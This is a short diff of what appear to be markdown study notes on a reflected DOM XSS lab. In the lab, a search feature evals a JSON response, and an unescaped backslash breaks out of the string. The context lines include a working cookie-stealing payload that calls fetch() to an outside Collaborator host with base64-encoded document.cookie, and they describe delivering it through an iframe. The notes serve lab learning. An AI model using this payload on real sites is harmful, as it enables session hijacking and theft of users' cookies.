@@ -222,7 +222,7 @@ document.cookie = "TopSecret=UnSafeCookieSessionValueForTopSecretCookie";
 
 >In the **Search** function a Reflected XSS vulnerability is identified. The attacker then deliver an exploit link to victim with cookie stealing payload in a hosted **iframe** on their exploit server.  
 
->The search JavaScript code on the target is using the data in JSON reflected response, that is then send to **eval()** function, and not sanitizing **\\** escape proper user input.  Backslash is not escaped correct and when the JSON response attempts to escape the opening double-quotes character, it adds a second backslash. The resulting double-backslash causes the escaping to be effectively canceled out.  
+>Identify The search JavaScript code on the target, return a JSON response. Validate that the backslash **\\** escape is not sanitized, and the JSON data is then send to **eval()**.  Backslash is not escaped correct and when the JSON response attempts to escape the opening double-quotes character, it adds a second backslash. The resulting double-backslash causes the escaping to be effectively canceled out.  
 
 ```JavaScript
 \"-fetch('https://Collaborator.com?cs='+btoa(document.cookie))}//
